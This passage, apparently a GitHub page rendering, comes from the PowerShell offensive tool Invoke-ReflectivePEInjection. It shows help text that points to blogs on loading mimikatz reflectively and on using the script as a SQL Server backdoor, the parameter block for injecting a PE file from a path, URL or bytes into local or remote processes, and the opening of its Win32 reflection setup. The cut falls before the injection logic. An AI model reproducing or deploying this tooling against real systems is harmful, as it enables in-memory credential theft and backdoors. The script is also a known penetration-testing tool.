          <td id="LC164" class="blob-code blob-code-inner js-file-line"><span class="pl-c">These function names ARE case sensitive. To create an exported DLL function for the wstring type, the function would</span></td>
        </tr>
        <tr>
          <td id="L165" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="165"></td>
          <td id="LC165" class="blob-code blob-code-inner js-file-line"><span class="pl-c">be declared as follows:</span></td>
        </tr>
        <tr>
          <td id="L166" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="166"></td>
          <td id="LC166" class="blob-code blob-code-inner js-file-line"><span class="pl-c">extern &quot;C&quot; __declspec( dllexport ) wchar_t* WStringFunc()</span></td>
        </tr>
        <tr>
          <td id="L167" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="167"></td>
          <td id="LC167" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L168" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="168"></td>
          <td id="LC168" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L169" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="169"></td>
          <td id="LC169" class="blob-code blob-code-inner js-file-line"><span class="pl-c">If you want to use a DLL which returns a different data type, or which takes parameters, you will need to modify</span></td>
        </tr>
        <tr>
          <td id="L170" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="170"></td>
          <td id="LC170" class="blob-code blob-code-inner js-file-line"><span class="pl-c">this script to accomodate this. You can find the code to modify in the section labeled &quot;YOUR CODE GOES HERE&quot;.</span></td>
        </tr>
        <tr>
          <td id="L171" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="171"></td>
          <td id="LC171" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L172" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="172"></td>
          <td id="LC172" class="blob-code blob-code-inner js-file-line"><span class="pl-c">Find a DemoDLL at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectiveDllInjection</span></td>
        </tr>
        <tr>
          <td id="L173" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="173"></td>
          <td id="LC173" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L174" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="174"></td>
          <td id="LC174" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c"><span class="pl-c1">.</span><span class="pl-k">LINK</span></span></span></td>
        </tr>
        <tr>
          <td id="L175" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="175"></td>
          <td id="LC175" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L176" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="176"></td>
          <td id="LC176" class="blob-code blob-code-inner js-file-line"><span class="pl-c">Blog: http://clymb3r.wordpress.com/</span></td>
        </tr>
        <tr>
          <td id="L177" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="177"></td>
          <td id="LC177" class="blob-code blob-code-inner js-file-line"><span class="pl-c">Github repo: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectivePEInjection</span></td>
        </tr>
        <tr>
          <td id="L178" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="178"></td>
          <td id="LC178" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L179" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="179"></td>
          <td id="LC179" class="blob-code blob-code-inner js-file-line"><span class="pl-c">Blog on reflective loading: http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/</span></td>
        </tr>
        <tr>
          <td id="L180" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="180"></td>
          <td id="LC180" class="blob-code blob-code-inner js-file-line"><span class="pl-c">Blog on modifying mimikatz for reflective loading: http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/</span></td>
        </tr>
        <tr>
          <td id="L181" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="181"></td>
          <td id="LC181" class="blob-code blob-code-inner js-file-line"><span class="pl-c">Blog on using this script as a backdoor with SQL server: http://www.casaba.com/blog/</span></td>
        </tr>
        <tr>
          <td id="L182" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="182"></td>
          <td id="LC182" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L183" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="183"></td>
          <td id="LC183" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#&gt;</span></span></td>
        </tr>
        <tr>
          <td id="L184" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="184"></td>
          <td id="LC184" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L185" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="185"></td>
          <td id="LC185" class="blob-code blob-code-inner js-file-line">[<span class="pl-c1">CmdletBinding</span>(<span class="pl-v">DefaultParameterSetName</span><span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">&quot;</span>WebFile<span class="pl-pds">&quot;</span></span>)]</td>
        </tr>
        <tr>
          <td id="L186" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="186"></td>
          <td id="LC186" class="blob-code blob-code-inner js-file-line"><span class="pl-k">Param</span>(</td>
        </tr>
        <tr>
          <td id="L187" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="187"></td>
          <td id="LC187" class="blob-code blob-code-inner js-file-line">	[<span class="pl-c1">Parameter</span>(<span class="pl-v">ParameterSetName</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">&quot;</span>LocalFile<span class="pl-pds">&quot;</span></span><span class="pl-k">,</span> <span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L188" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="188"></td>
          <td id="LC188" class="blob-code blob-code-inner js-file-line">	[<span class="pl-k">String</span>]</td>
        </tr>
        <tr>
          <td id="L189" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="189"></td>
          <td id="LC189" class="blob-code blob-code-inner js-file-line">	<span class="pl-smi">$PEPath</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L190" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="190"></td>
          <td id="LC190" class="blob-code blob-code-inner js-file-line">	</td>
        </tr>
        <tr>
          <td id="L191" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="191"></td>
          <td id="LC191" class="blob-code blob-code-inner js-file-line">	[<span class="pl-c1">Parameter</span>(<span class="pl-v">ParameterSetName</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">&quot;</span>WebFile<span class="pl-pds">&quot;</span></span><span class="pl-k">,</span> <span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L192" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="192"></td>
          <td id="LC192" class="blob-code blob-code-inner js-file-line">	[<span class="pl-k">Uri</span>]</td>
        </tr>
        <tr>
          <td id="L193" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="193"></td>
          <td id="LC193" class="blob-code blob-code-inner js-file-line">	<span class="pl-smi">$PEUrl</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L194" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="194"></td>
          <td id="LC194" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L195" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="195"></td>
          <td id="LC195" class="blob-code blob-code-inner js-file-line">    [<span class="pl-c1">Parameter</span>(<span class="pl-v">ParameterSetName</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Bytes<span class="pl-pds">&quot;</span></span><span class="pl-k">,</span> <span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L196" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="196"></td>
          <td id="LC196" class="blob-code blob-code-inner js-file-line">    [<span class="pl-c1">ValidateNotNullOrEmpty</span>()]</td>
        </tr>
        <tr>
          <td id="L197" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="197"></td>
          <td id="LC197" class="blob-code blob-code-inner js-file-line">    [<span class="pl-k">Byte</span>[]]</td>
        </tr>
        <tr>
          <td id="L198" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="198"></td>
          <td id="LC198" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">$PEBytes</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L199" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="199"></td>
          <td id="LC199" class="blob-code blob-code-inner js-file-line">	</td>
        </tr>
        <tr>
          <td id="L200" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="200"></td>
          <td id="LC200" class="blob-code blob-code-inner js-file-line">	[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">1</span>)]</td>
        </tr>
        <tr>
          <td id="L201" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="201"></td>
          <td id="LC201" class="blob-code blob-code-inner js-file-line">	[<span class="pl-k">String</span>[]]</td>
        </tr>
        <tr>
          <td id="L202" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="202"></td>
          <td id="LC202" class="blob-code blob-code-inner js-file-line">	<span class="pl-smi">$ComputerName</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L203" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="203"></td>
          <td id="LC203" class="blob-code blob-code-inner js-file-line">	</td>
        </tr>
        <tr>
          <td id="L204" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="204"></td>
          <td id="LC204" class="blob-code blob-code-inner js-file-line">	[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">2</span>)]</td>
        </tr>
        <tr>
          <td id="L205" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="205"></td>
          <td id="LC205" class="blob-code blob-code-inner js-file-line">    [<span class="pl-c1">ValidateSet</span>( <span class="pl-s"><span class="pl-pds">&#39;</span>WString<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>String<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Void<span class="pl-pds">&#39;</span></span> )]</td>
        </tr>
        <tr>
          <td id="L206" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="206"></td>
          <td id="LC206" class="blob-code blob-code-inner js-file-line">	[<span class="pl-k">String</span>]</td>
        </tr>
        <tr>
          <td id="L207" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="207"></td>
          <td id="LC207" class="blob-code blob-code-inner js-file-line">	<span class="pl-smi">$FuncReturnType</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Void<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L208" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="208"></td>
          <td id="LC208" class="blob-code blob-code-inner js-file-line">	</td>
        </tr>
        <tr>
          <td id="L209" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="209"></td>
          <td id="LC209" class="blob-code blob-code-inner js-file-line">	[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">3</span>)]</td>
        </tr>
        <tr>
          <td id="L210" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="210"></td>
          <td id="LC210" class="blob-code blob-code-inner js-file-line">	[<span class="pl-k">String</span>]</td>
        </tr>
        <tr>
          <td id="L211" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="211"></td>
          <td id="LC211" class="blob-code blob-code-inner js-file-line">	<span class="pl-smi">$ExeArgs</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L212" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="212"></td>
          <td id="LC212" class="blob-code blob-code-inner js-file-line">	</td>
        </tr>
        <tr>
          <td id="L213" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="213"></td>
          <td id="LC213" class="blob-code blob-code-inner js-file-line">	[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">4</span>)]</td>
        </tr>
        <tr>
          <td id="L214" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="214"></td>
          <td id="LC214" class="blob-code blob-code-inner js-file-line">	[<span class="pl-k">Int32</span>]</td>
        </tr>
        <tr>
          <td id="L215" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="215"></td>
          <td id="LC215" class="blob-code blob-code-inner js-file-line">	<span class="pl-smi">$ProcId</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L216" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="216"></td>
          <td id="LC216" class="blob-code blob-code-inner js-file-line">	</td>
        </tr>
        <tr>
          <td id="L217" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="217"></td>
          <td id="LC217" class="blob-code blob-code-inner js-file-line">	[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">5</span>)]</td>
        </tr>
        <tr>
          <td id="L218" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="218"></td>
          <td id="LC218" class="blob-code blob-code-inner js-file-line">	[<span class="pl-k">String</span>]</td>
        </tr>
        <tr>
          <td id="L219" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="219"></td>
          <td id="LC219" class="blob-code blob-code-inner js-file-line">	<span class="pl-smi">$ProcName</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L220" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="220"></td>
          <td id="LC220" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L221" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="221"></td>
          <td id="LC221" class="blob-code blob-code-inner js-file-line">    [<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">6</span>)]</td>
        </tr>
        <tr>
          <td id="L222" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="222"></td>
          <td id="LC222" class="blob-code blob-code-inner js-file-line">    [<span class="pl-k">Switch</span>]</td>
        </tr>
        <tr>
          <td id="L223" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="223"></td>
          <td id="LC223" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">$ForceASLR</span></td>
        </tr>
        <tr>
          <td id="L224" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="224"></td>
          <td id="LC224" class="blob-code blob-code-inner js-file-line">)</td>
        </tr>
        <tr>
          <td id="L225" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="225"></td>
          <td id="LC225" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L226" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="226"></td>
          <td id="LC226" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">Set-StrictMode</span> <span class="pl-k">-</span>Version <span class="pl-c1">2</span></td>
        </tr>
        <tr>
          <td id="L227" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="227"></td>
          <td id="LC227" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L228" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="228"></td>
          <td id="LC228" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L229" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="229"></td>
          <td id="LC229" class="blob-code blob-code-inner js-file-line"><span class="pl-smi">$RemoteScriptBlock</span> <span class="pl-k">=</span> {</td>
        </tr>
        <tr>
          <td id="L230" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="230"></td>
          <td id="LC230" class="blob-code blob-code-inner js-file-line">	[<span class="pl-c1">CmdletBinding</span>()]</td>
        </tr>
        <tr>
          <td id="L231" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="231"></td>
          <td id="LC231" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">Param</span>(</td>
        </tr>
        <tr>
          <td id="L232" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="232"></td>
          <td id="LC232" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L233" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="233"></td>
          <td id="LC233" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">Byte</span>[]]</td>
        </tr>
        <tr>
          <td id="L234" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="234"></td>
          <td id="LC234" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PEBytes</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L235" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="235"></td>
          <td id="LC235" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L236" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="236"></td>
          <td id="LC236" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">1</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L237" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="237"></td>
          <td id="LC237" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">String</span>]</td>
        </tr>
        <tr>
          <td id="L238" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="238"></td>
          <td id="LC238" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$FuncReturnType</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L239" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="239"></td>
          <td id="LC239" class="blob-code blob-code-inner js-file-line">				</td>
        </tr>
        <tr>
          <td id="L240" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="240"></td>
          <td id="LC240" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">2</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L241" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="241"></td>
          <td id="LC241" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">Int32</span>]</td>
        </tr>
        <tr>
          <td id="L242" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="242"></td>
          <td id="LC242" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$ProcId</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L243" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="243"></td>
          <td id="LC243" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L244" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="244"></td>
          <td id="LC244" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">3</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L245" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="245"></td>
          <td id="LC245" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">String</span>]</td>
        </tr>
        <tr>
          <td id="L246" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="246"></td>
          <td id="LC246" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$ProcName</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L247" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="247"></td>
          <td id="LC247" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L248" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="248"></td>
          <td id="LC248" class="blob-code blob-code-inner js-file-line">        [<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">4</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L249" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="249"></td>
          <td id="LC249" class="blob-code blob-code-inner js-file-line">        [<span class="pl-k">Bool</span>]</td>
        </tr>
        <tr>
          <td id="L250" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="250"></td>
          <td id="LC250" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">$ForceASLR</span></td>
        </tr>
        <tr>
          <td id="L251" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="251"></td>
          <td id="LC251" class="blob-code blob-code-inner js-file-line">	)</td>
        </tr>
        <tr>
          <td id="L252" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="252"></td>
          <td id="LC252" class="blob-code blob-code-inner js-file-line">	</td>
        </tr>
        <tr>
          <td id="L253" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="253"></td>
          <td id="LC253" class="blob-code blob-code-inner js-file-line">	<span class="pl-c"><span class="pl-c">#</span>##################################</span></td>
        </tr>
        <tr>
          <td id="L254" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="254"></td>
          <td id="LC254" class="blob-code blob-code-inner js-file-line">	<span class="pl-c"><span class="pl-c">#</span>#########  Win32 Stuff  ##########</span></td>
        </tr>
        <tr>
          <td id="L255" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="255"></td>
          <td id="LC255" class="blob-code blob-code-inner js-file-line">	<span class="pl-c"><span class="pl-c">#</span>##################################</span></td>
        </tr>
        <tr>
          <td id="L256" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="256"></td>
          <td id="LC256" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">Function</span> <span class="pl-en">Get-Win32Types</span></td>
        </tr>
        <tr>
          <td id="L257" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="257"></td>
          <td id="LC257" class="blob-code blob-code-inner js-file-line">	{</td>
        </tr>
        <tr>
          <td id="L258" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="258"></td>
          <td id="LC258" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Types</span> <span class="pl-k">=</span> <span class="pl-c1">New-Object</span> System.Object</td>
        </tr>
        <tr>
          <td id="L259" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="259"></td>
          <td id="LC259" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L260" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="260"></td>
          <td id="LC260" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Define all the structures/enums that will be used</span></td>
        </tr>
        <tr>
          <td id="L261" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="261"></td>
          <td id="LC261" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html</span></td>
        </tr>
        <tr>
          <td id="L262" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="262"></td>
          <td id="LC262" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Domain</span> <span class="pl-k">=</span> [<span class="pl-k">AppDomain</span>]::CurrentDomain</td>
        </tr>
        <tr>
          <td id="L263" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="263"></td>
          <td id="LC263" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$DynamicAssembly</span> <span class="pl-k">=</span> <span class="pl-c1">New-Object</span> System.Reflection.AssemblyName(<span class="pl-s"><span class="pl-pds">&#39;</span>DynamicAssembly<span class="pl-pds">&#39;</span></span>)</td>
        </tr>
        <tr>
          <td id="L264" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="264"></td>
          <td id="LC264" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$AssemblyBuilder</span> <span class="pl-k">=</span> <span class="pl-smi">$Domain<span class="pl-smi">.DefineDynamicAssembly</span></span>(<span class="pl-smi">$DynamicAssembly</span><span class="pl-k">,</span> [<span class="pl-k">System.Reflection.Emit.AssemblyBuilderAccess</span>]::Run)</td>
        </tr>
        <tr>
          <td id="L265" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="265"></td>
          <td id="LC265" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$ModuleBuilder</span> <span class="pl-k">=</span> <span class="pl-smi">$AssemblyBuilder<span class="pl-smi">.DefineDynamicModule</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>DynamicModule<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L266" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="266"></td>
          <td id="LC266" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$ConstructorInfo</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.MarshalAsAttribute</span>].GetConstructors()[<span class="pl-c1">0</span>]</td>
        </tr>
        <tr>
          <td id="L267" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="267"></td>
          <td id="LC267" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L268" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="268"></td>
          <td id="LC268" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L269" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="269"></td>
          <td id="LC269" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>###########    ENUM    ############</span></td>
        </tr>
        <tr>
          <td id="L270" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="270"></td>
          <td id="LC270" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Enum MachineType</span></td>
        </tr>
        <tr>
          <td id="L271" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="271"></td>
          <td id="LC271" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder</span> <span class="pl-k">=</span> <span class="pl-smi">$ModuleBuilder<span class="pl-smi">.DefineEnum</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>MachineType<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>])</td>
        </tr>
        <tr>
          <td id="L272" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="272"></td>
